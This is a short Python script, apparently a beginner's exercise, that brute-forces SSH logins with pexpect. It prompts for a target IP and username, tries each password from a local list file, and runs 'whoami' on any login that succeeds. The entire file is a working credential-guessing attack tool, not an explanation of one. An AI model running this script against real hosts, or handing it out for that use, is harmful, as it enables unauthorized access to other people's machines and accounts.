import pexpect
from termcolor import colored
PROMPT = ['# ','>>> ','>','\$']

def send_command(child,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(colored(child.before.decode('utf-8'),'yellow'))

def connect(user,host,password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[p|p]assword: '])
    if ret ==0:
        print('ERROR CONNECTING')
        return
    if ret ==1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,'[P|p]assword: '])
        if ret==0:
            print('ERROR CONNECTING')
            return
    child.sendline(password)
    child.expect(PROMPT,timeout=0.5)
    return child

def main():

    host = input('ENTET IP ADDR TO TARGET BRUTEFORCE >:')
    user = input('ENTER THE USERNAME OF MACHINE TO BRUTEFORCE >:')
    #password= input('ENTER THE PASSWORD OF MACHINE TO BRUTEFORCE >:')
    with open('level1/passwords.txt','r') as file:
        for password in file.readlines():
                try:
                    child = connect(user,host,password)
                    print(colored('child connected','green'),password)
                    send_command(child,'whoami')
                except:
                    print(colored('child is refusing as pass in incorrect....','magenta'))

 

main()
